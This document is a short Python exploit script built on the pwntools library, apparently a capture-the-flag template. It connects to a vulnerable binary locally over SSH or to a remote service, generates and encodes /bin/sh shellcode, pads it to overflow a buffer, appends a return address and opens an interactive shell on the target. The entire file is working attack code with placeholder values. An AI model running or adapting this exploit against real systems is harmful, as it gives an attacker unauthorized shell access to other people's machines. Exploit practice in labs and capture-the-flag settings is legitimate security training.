from pwn import *


context.clear(arch='amd64',os='linux')
run_local = False
if run_local:
	s = ssh(host='localhost',user='user',port=2222)
	r= s.process('/home/user/vuln')
	#pid=gdb.attach(r)
	#input("wait")
else:
	r=remote("remoteprocess",remoteport)





sc= shellcraft.sh()

sc=asm(sc)

sc_encoded=pwnlib.encoders.encoder.encode(sc,b'binsh')

shellcode = sc_encoded

shellcode = shellcode.ljust(BUFF_SIZE, b"A") + p64(CODE_ADDR)

input("send shellcode")
r.send(shellcode)

r.interactive()
